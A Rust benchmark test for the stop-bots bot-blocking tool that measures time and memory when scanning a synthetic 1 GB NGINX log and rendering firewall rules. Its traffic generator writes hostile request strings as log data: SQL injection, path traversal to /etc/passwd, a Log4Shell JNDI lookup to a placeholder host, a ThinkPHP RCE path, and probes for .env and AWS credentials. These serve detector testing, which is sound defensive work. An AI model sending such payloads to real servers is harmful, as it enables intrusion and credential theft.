/*  This file is part of the stop-bots project.
 *
 *  Copyright (C) 2026 Marko Ivankovic
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU Affero General Public License as published
 *  by the Free Software Foundation, version 3 of the License.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU Affero General Public License for more details.
 *
 *  You should have received a copy of the GNU Affero General License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

//! The resource benchmark: what the work a small VPS does every minute
//! costs on a large host, against a budget that fails CI when it regresses.
//!
//! A 1 GB NGINX access log, read and run through every detector by `batch
//! --no-fetch`, then 10 MB appended and read again; then 100,000 country
//! and reputation ranges stored and rendered into an nftables script by
//! `render-firewall`. The real binary every time, against a database and
//! files in a temp directory, so the budget covers what a user runs and
//! not a function picked out of it. Each step's wall time and peak RSS
//! come from `wait4`, the child's own `getrusage`.
//!
//! The budgets are in [`BUDGETS`], with how they were measured. They are
//! there to catch an order-of-magnitude regression — the whole log re-read
//! on every pass, a render that went quadratic, memory that grows with the
//! log — not a 10% one, which CI runners' noise would drown anyway.
//!
//! **It does not run by default.** It writes a gigabyte and takes about a
//! minute. Set `STOP_BOTS_BENCH=1`, in a release build, or run `make
//! bench`. `STOP_BOTS_BENCH_LOG_MB` sets the log's size (1000 by default);
//! the scan's time budget scales with it, the memory budgets do not.
//! `STOP_BOTS_BENCH_KEEP=1` keeps the temp directory, database and log
//! included, and says where it is, to profile a step by hand.

use std::fs::{self, File, OpenOptions};
use std::io::{BufWriter, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

mod common;

/// What one step may cost: wall-clock seconds and peak resident memory.
struct Budget {
    step: &'static str,
    seconds: f64,
    peak_mb: f64,
}

/// The budgets: about 3x the slower measured time and 1.5x the larger
/// measured peak, rounded up, with a floor of a few seconds where the
/// step is so quick that scheduling noise is most of it.
///
/// Measured on 2026-10-16 with a 1000 MB log, release build, on a busy
/// 20-thread x86_64 desktop (NVMe, warm page cache; the spread is three
/// runs) and on GitHub's `ubuntu-latest` (the `bench` job in ci.yml, one
/// run). The runner took about the same for the first scan and twice as
/// long for the second, whose time is mostly SQLite reading the stored
/// evidence rather than the log.
///
/// | step                  | local          | ubuntu-latest  | budget        |
/// |-----------------------|----------------|----------------|---------------|
/// | first scan of the log | 34-63s, 172 MB | 64s, 173 MB    | 200s, 260 MB  |
/// | scan 10 MB appended   | 7.6-8.6s, 49 MB| 17s, 52 MB     | 50s, 80 MB    |
/// | store 100k ranges     | 0.2s, 13 MB    | 0.2s, 14 MB    | 3s, 24 MB     |
/// | render 100k ranges    | 0.2s, 66 MB    | 0.3s, 70 MB    | 3s, 105 MB    |
///
/// The second scan's time budget is also what catches the whole log being
/// re-read: that would cost it the first scan's minute on top. The first
/// scan's memory budget matters beyond regression: the README says a 1 GB
/// VPS is enough, and this is what a first pass over a large log takes on
/// one. It is the evidence the pass collects, which grows with what it
/// reads, up to the gigabyte one pass reads at most.
const BUDGETS: [Budget; 4] = [
    Budget {
        step: SCAN,
        seconds: 200.0,
        peak_mb: 260.0,
    },
    Budget {
        step: SCAN_APPENDED,
        seconds: 50.0,
        peak_mb: 80.0,
    },
    Budget {
        step: STORE_RANGES,
        seconds: 3.0,
        peak_mb: 24.0,
    },
    Budget {
        step: RENDER,
        seconds: 3.0,
        peak_mb: 105.0,
    },
];

const SCAN: &str = "first scan of the log";
const SCAN_APPENDED: &str = "scan 10 MB appended";
const STORE_RANGES: &str = "store 100k ranges";
const RENDER: &str = "render 100k ranges";

/// The log size the budgets are for, in MB.
const BUDGET_LOG_MB: u64 = 1000;

/// What is appended between the two scans, in MB.
const APPENDED_MB: u64 = 10;

/// How many ranges the render covers, and how they are split between
/// the feeds they come from.
const RANGES: [(Feed, usize); 3] = [
    (Feed::Country("us"), 50_000),
    (Feed::Country("cn"), 30_000),
    (Feed::Reputation("firehol-level1"), 20_000),
];

#[derive(Clone, Copy)]
enum Feed {
    Country(&'static str),
    Reputation(&'static str),
}

/// What one step cost.
struct Measured {
    step: &'static str,
    wall: Duration,
    peak_kb: u64,
}

impl Measured {
    /// Several runs that make up one step: their times add up, and the
    /// peak is the largest of theirs.
    fn combine(step: &'static str, runs: &[Measured]) -> Measured {
        Measured {
            step,
            wall: runs.iter().map(|r| r.wall).sum(),
            peak_kb: runs.iter().map(|r| r.peak_kb).max().unwrap_or(0),
        }
    }
}

/// A throwaway host: database, NGINX root with one site, the directories
/// the product writes generated files into, and the logs.
struct Host {
    dir: tempfile::TempDir,
}

impl Host {
    fn new() -> Host {
        // Under target/, not /tmp: on a machine where /tmp is a tmpfs, a
        // gigabyte of log there is a gigabyte of RAM.
        let dir = tempfile::tempdir_in(env!("CARGO_TARGET_TMPDIR")).unwrap();
        let nginx = dir.path().join("nginx");
        fs::create_dir_all(&nginx).unwrap();
        fs::write(
            nginx.join("example.com.conf"),
            "server {\n    listen 80;\n    server_name example.com;\n}\n",
        )
        .unwrap();
        Host { dir }
    }

    fn path(&self, name: &str) -> PathBuf {
        self.dir.path().join(name)
    }

    fn access_log(&self) -> PathBuf {
        self.path("access.log")
    }

    /// `stop-bots` with `args`, `--db`, and every place it would write or
    /// read outside this host pointed inside it.
    fn command(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_stop-bots"));
        cmd.env_remove("STOP_BOTS_DB")
            .env("STOP_BOTS_NGINX_DIR", self.path("managed"))
            .env("STOP_BOTS_APACHE_DIR", self.path("managed"))
            .env("STOP_BOTS_NGINX_CONF_D", self.path("conf.d"))
            .env("STOP_BOTS_HOST_CONF", self.path("host.conf"))
            .env("STOP_BOTS_SSH_CLIENT", "")
            .args(args)
            .arg("--db")
            .arg(self.path("db.sqlite3"));
        common::network_tripwire().route(&mut cmd);
        cmd
    }

    /// Runs `args` to completion, unmeasured, and fails the test if it
    /// fails.
    fn run(&self, args: &[&str]) {
        self.measure("setup", args);
    }

    /// Runs `args`, and returns its wall time and peak RSS. Fails the test
    /// if it fails, with its output: a step that errored out early would
    /// otherwise look like a very fast one.
    fn measure(&self, step: &'static str, args: &[&str]) -> Measured {
        let out = self.path("output.txt");
        let mut cmd = self.command(args);
        let output = File::create(&out).unwrap();
        cmd.stdin(Stdio::null())
            .stdout(output.try_clone().unwrap())
            .stderr(output);
        let started = Instant::now();
        // Reaped by `wait4`, which `Child::wait` cannot stand in for.
        #[allow(clippy::zombie_processes)]
        let pid = cmd.spawn().unwrap().id();
        let (status, peak_kb) = wait4(pid);
        let wall = started.elapsed();
        assert!(
            status == 0,
            "`stop-bots {}` failed (wait status {status}):\n{}",
            args.join(" "),
            fs::read_to_string(&out).unwrap_or_default()
        );
        Measured {
            step,
            wall,
            peak_kb,
        }
    }

    fn scan(&self, step: &'static str) -> Measured {
        let root = self.path("nginx");
        let out = self.path("firewall.nft");
        let log = self.access_log();
        self.measure(
            step,
            &[
                "batch",
                "--no-fetch",
                "--backend",
                "nftables",
                "--root",
                root.to_str().unwrap(),
                "--out",
                out.to_str().unwrap(),
                "--ssh-log",
                AUTH_LOG,
                "--access-log",
                log.to_str().unwrap(),
            ],
        )
    }
}

/// An SSH log with one login, from an address no range below covers, so
/// the lockout check has something to read and nothing to object to.
const AUTH_LOG: &str = "tests/fixtures/logs/auth.log";

/// Reaps `pid` and returns its wait status and peak RSS in KB, which is
/// what `ru_maxrss` is on Linux. `wait4` rather than `Child::wait`, which
/// throws the resource usage away; once this has reaped the child, the
/// `Child` is simply dropped, which does not wait.
fn wait4(pid: u32) -> (i32, u64) {
    let mut status = 0;
    // SAFETY: an all-zero rusage is a valid value, and wait4 writes it.
    let mut usage: libc::rusage = unsafe { std::mem::zeroed() };
    // SAFETY: pid is our own unreaped child; both pointers are valid.
    let reaped = unsafe { libc::wait4(pid as libc::pid_t, &mut status, 0, &mut usage) };
    assert_eq!(reaped, pid as libc::pid_t, "wait4 failed");
    (status, usage.ru_maxrss as u64)
}

fn enabled() -> bool {
    if std::env::var_os("STOP_BOTS_BENCH").is_some() {
        return true;
    }
    stop_bots::say_err!(
        "skipping: the resource benchmark is off. Set STOP_BOTS_BENCH=1 \
         (or run `make bench`) to enable it."
    );
    false
}

fn log_mb() -> u64 {
    std::env::var("STOP_BOTS_BENCH_LOG_MB")
        .ok()
        .map(|mb| mb.parse().expect("STOP_BOTS_BENCH_LOG_MB is a number"))
        .unwrap_or(BUDGET_LOG_MB)
}

#[test]
fn resource_use_stays_within_budget() {
    if !enabled() {
        return;
    }
    let mb = log_mb();
    let host = Host::new();
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;

    for detector in ["honeypot", "asset-ratio", "rotating-ua", "refererless"] {
        host.run(&["set-detector", detector, "--enabled", "true"]);
    }

    // Twenty hours of traffic ending a minute ago, inside every
    // detector's window, then the next ten minutes appended.
    let started = Instant::now();
    let mut log = Traffic::new(now - 20 * 3600, now - 60, mb << 20);
    log.write(&host.access_log(), mb << 20, false);
    let generated = started.elapsed();
    stop_bots::say!(
        "generated {mb} MB of access log ({} lines) in {:.1}s",
        log.lines,
        generated.as_secs_f64()
    );

    let mut results = vec![host.scan(SCAN)];
    let mut appended = Traffic::new(now - 60, now, APPENDED_MB << 20);
    appended.write(&host.access_log(), APPENDED_MB << 20, true);
    results.push(host.scan(SCAN_APPENDED));

    let mut stores = Vec::new();
    let mut first = 0u32;
    for (feed, count) in RANGES {
        let source = host.path("ranges.txt");
        write_ranges(&source, first, count);
        first += count as u32;
        let source = source.to_str().unwrap();
        stores.push(match feed {
            Feed::Country(code) => host.measure(
                STORE_RANGES,
                &[
                    "update-country-ranges",
                    "--country",
                    code,
                    "--source",
                    source,
                ],
            ),
            Feed::Reputation(id) => host.measure(
                STORE_RANGES,
                &[
                    "update-reputation-sources",
                    "--source-id",
                    id,
                    "--source",
                    source,
                ],
            ),
        });
        match feed {
            Feed::Country(code) => host.run(&["add-country", "--country", code]),
            Feed::Reputation(id) => host.run(&[
                "set-reputation-source",
                "--source-id",
                id,
                "--enabled",
                "true",
            ]),
        }
    }
    results.push(Measured::combine(STORE_RANGES, &stores));

    let script = host.path("render.nft");
    results.push(host.measure(
        RENDER,
        &[
            "render-firewall",
            "--backend",
            "nftables",
            "--out",
            script.to_str().unwrap(),
            "--ssh-log",
            AUTH_LOG,
        ],
    ));
    let rendered = fs::read_to_string(&script).unwrap();
    let blocked = rendered.matches("/24").count();
    assert!(
        blocked >= first as usize,
        "the script should block every stored range, but names {blocked} of {first}"
    );

    let over = report(&results, mb);
    if std::env::var_os("STOP_BOTS_BENCH_KEEP").is_some() {
        stop_bots::say!("kept {}", host.dir.keep().display());
    }
    assert!(over.is_empty(), "over budget: {}", over.join(", "));
}

/// Prints the results against their budgets, here and in the GitHub job
/// summary when there is one, and returns the steps that went over.
fn report(results: &[Measured], mb: u64) -> Vec<String> {
    let mut table =
        String::from("| step | time | budget | peak RSS | budget |\n|---|--:|--:|--:|--:|\n");
    let mut over = Vec::new();
    for result in results {
        let budget = BUDGETS
            .iter()
            .find(|b| b.step == result.step)
            .expect("every step has a budget");
        let mut seconds = budget.seconds;
        if result.step == SCAN {
            seconds *= mb as f64 / BUDGET_LOG_MB as f64;
        }
        let took = result.wall.as_secs_f64();
        let peak_mb = result.peak_kb as f64 / 1024.0;
        let mut verdict = Vec::new();
        if took > seconds {
            verdict.push("time");
        }
        if peak_mb > budget.peak_mb {
            verdict.push("memory");
        }
        if !verdict.is_empty() {
            over.push(format!("{} ({})", result.step, verdict.join(" and ")));
        }
        table.push_str(&format!(
            "| {} | {took:.2}s | {seconds:.0}s | {peak_mb:.0} MB | {:.0} MB |{}\n",
            result.step,
            budget.peak_mb,
            if verdict.is_empty() { "" } else { " **over**" },
        ));
    }
    stop_bots::say!("\n{table}");
    if let Some(summary) = std::env::var_os("GITHUB_STEP_SUMMARY") {
        if let Ok(mut file) = OpenOptions::new().append(true).open(summary) {
            let _ = writeln!(file, "### Resource benchmark ({mb} MB log)\n\n{table}");
        }
    }
    over
}

/// `count` disjoint /24s, numbered from `first`, starting at 11.0.0.0 so
/// none is private, reserved or the SSH login's address.
fn write_ranges(path: &Path, first: u32, count: usize) {
    let mut out = BufWriter::new(File::create(path).unwrap());
    let base = u32::from(std::net::Ipv4Addr::new(11, 0, 0, 0)) >> 8;
    for n in first..first + count as u32 {
        let net = std::net::Ipv4Addr::from((base + n) << 8);
        writeln!(out, "{net}/24").unwrap();
    }
    out.flush().unwrap();
}

/// A synthetic, deterministic NGINX combined-format log, with the mix a
/// public host sees: browsers fetching pages and their assets, crawlers,
/// scanners walking for 404s, probes for `/.env`, injection attempts,
/// forged Googlebots, and bots rotating their user agent. Many distinct
/// addresses, IPv4 and IPv6, since what the detectors keep grows with
/// those, not with the line count.
struct Traffic {
    rng: u64,
    from: i64,
    seconds_per_byte: f64,
    written: u64,
    lines: u64,
}

const BROWSERS: [&str; 4] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
];
const GOOGLEBOT: &str = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
const SCANNER_PATHS: [&str; 6] = [
    "/wp-login.php",
    "/admin/config.php",
    "/phpmyadmin/index.php",
    "/cgi-bin/luci",
    "/backup.zip",
    "/old/site.tar.gz",
];
const PROBES: [&str; 5] = [
    "/.env",
    "/.git/config",
    "/.aws/credentials",
    "/wp-config.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
];
const INJECTIONS: [&str; 4] = [
    "/index.php?id=-1%20UNION%20SELECT%201,2,3--",
    "/cgi-bin/../../../../etc/passwd",
    "/?x=${jndi:ldap://203.0.113.9/a}",
    "/index.php?s=/index/think/app/invokefunction&function=call_user_func_array",
];

impl Traffic {
    /// Traffic from `from` to `to`, spread evenly over `bytes` of log.
    fn new(from: i64, to: i64, bytes: u64) -> Traffic {
        Traffic {
            rng: 0x5eed ^ from as u64,
            from,
            seconds_per_byte: (to - from) as f64 / bytes as f64,
            written: 0,
            lines: 0,
        }
    }

    fn next(&mut self) -> u64 {
        // splitmix64: deterministic, and no dependency for it.
        self.rng = self.rng.wrapping_add(0x9e37_79b9_7f4a_7c15);
        let mut z = self.rng;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58_476d_1ce4_e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d0_49bb_1331_11eb);
        z ^ (z >> 31)
    }

    fn below(&mut self, n: u64) -> u64 {
        self.next() % n
    }

    /// One of `pool` addresses, distinct per `kind`: v4 in a /8 of the
    /// kind's own, one in eight of them v6.
    fn address(&mut self, kind: u8, pool: u64) -> String {
        let n = self.below(pool);
        if n % 8 == 7 {
            format!("2001:db8:{kind:x}::{:x}:{:x}", n >> 16, n & 0xffff)
        } else {
            format!(
                "{}.{}.{}.{}",
                100 + kind,
                (n >> 16) & 0xff,
                (n >> 8) & 0xff,
                n & 0xff
            )
        }
    }

    /// Appends lines to `path` until `bytes` have been written.
    fn write(&mut self, path: &Path, bytes: u64, append: bool) {
        let file = OpenOptions::new()
            .create(true)
            .write(true)
            .append(append)
            .truncate(!append)
            .open(path)
            .unwrap();
        let mut out = BufWriter::with_capacity(1 << 20, file);
        let mut line = String::with_capacity(512);
        while self.written < bytes {
            line.clear();
            self.line(&mut line);
            out.write_all(line.as_bytes()).unwrap();
            self.written += line.len() as u64;
            self.lines += 1;
        }
        out.flush().unwrap();
    }

    fn line(&mut self, line: &mut String) {
        use std::fmt::Write;
        let at = self.from + (self.written as f64 * self.seconds_per_byte) as i64;
        let roll = self.below(1000);
        let (ip, method, path, status, referer, ua): (String, &str, String, u16, String, String) =
            match roll {
                // Browsers: a page, or one of its assets, with a referer.
                0..=799 => {
                    let ip = self.address(0, 200_000);
                    let page = self.below(5000);
                    let ua = BROWSERS[self.below(BROWSERS.len() as u64) as usize].to_string();
                    let referer = format!("https://example.com/blog/post-{}", self.below(5000));
                    let path = match self.below(4) {
                        0 => format!("/blog/post-{page}"),
                        1 => "/static/app.css?v=3".to_string(),
                        2 => "/static/app.js?v=3".to_string(),
                        _ => format!("/img/{page}.webp"),
                    };
                    let status = if self.below(10) == 0 { 304 } else { 200 };
                    (ip, "GET", path, status, referer, ua)
                }
                // Crawlers that are what they say.
                800..=849 => (
                    format!("66.249.{}.{}", 64 + self.below(32), self.below(256)),
                    "GET",
                    format!("/blog/post-{}", self.below(5000)),
                    200,
                    "-".to_string(),
                    GOOGLEBOT.to_string(),
                ),
                // Forged Googlebots.
                850..=854 => (
                    self.address(1, 2_000),
                    "GET",
                    format!("/blog/post-{}", self.below(5000)),
                    200,
                    "-".to_string(),
                    GOOGLEBOT.to_string(),
                ),
                // Scanners walking for 404s.
                855..=914 => {
                    let path = SCANNER_PATHS[self.below(SCANNER_PATHS.len() as u64) as usize];
                    (
                        self.address(2, 2_000),
                        "GET",
                        format!("{path}?{}", self.below(50)),
                        404,
                        "-".to_string(),
                        "python-requests/2.32.3".to_string(),
                    )
                }
                // Probes for secrets.
                915..=929 => (
                    self.address(3, 5_000),
                    "GET",
                    PROBES[self.below(PROBES.len() as u64) as usize].to_string(),
                    404,
                    "-".to_string(),
                    "Mozilla/5.0 zgrab/0.x".to_string(),
                ),
                // Injection attempts.
                930..=939 => (
                    self.address(4, 5_000),
                    "GET",
                    INJECTIONS[self.below(INJECTIONS.len() as u64) as usize].to_string(),
                    400,
                    "-".to_string(),
                    "curl/8.5.0".to_string(),
                ),
                // A bot rotating its user agent, fetching no assets, sending
                // no referer.
                _ => {
                    let version = self.below(10_000);
                    (
                        self.address(5, 1_000),
                        if self.below(20) == 0 { "POST" } else { "GET" },
                        format!("/blog/post-{}", self.below(5000)),
                        200,
                        "-".to_string(),
                        format!("Mozilla/5.0 (Windows NT 10.0) Chrome/{version}.0.0.0"),
                    )
                }
            };
        let bytes = 200 + self.below(30_000);
        let _ = writeln!(
            line,
            "{ip} - - [{}] \"{method} {path} HTTP/1.1\" {status} {bytes} \"{referer}\" \"{ua}\"",
            clf_time(at)
        );
    }
}

/// `at` as NGINX's `$time_local` writes it, in UTC: `16/Oct/2026:12:00:00
/// +0000`.
fn clf_time(at: i64) -> String {
    const MONTHS: [&str; 12] = [
        "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
    ];
    let (days, secs) = (at.div_euclid(86_400), at.rem_euclid(86_400));
    // Howard Hinnant's civil_from_days.
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = yoe + era * 400 + i64::from(month <= 2);
    format!(
        "{day:02}/{}/{year}:{:02}:{:02}:{:02} +0000",
        MONTHS[(month - 1) as usize],
        secs / 3600,
        secs / 60 % 60,
        secs % 60
    )
}

#[test]
fn clf_time_matches_what_nginx_writes() {
    assert_eq!(clf_time(0), "01/Jan/1970:00:00:00 +0000");
    assert_eq!(clf_time(1_792_152_000), "16/Oct/2026:12:00:00 +0000");
    assert_eq!(clf_time(951_782_400), "29/Feb/2000:00:00:00 +0000");
}
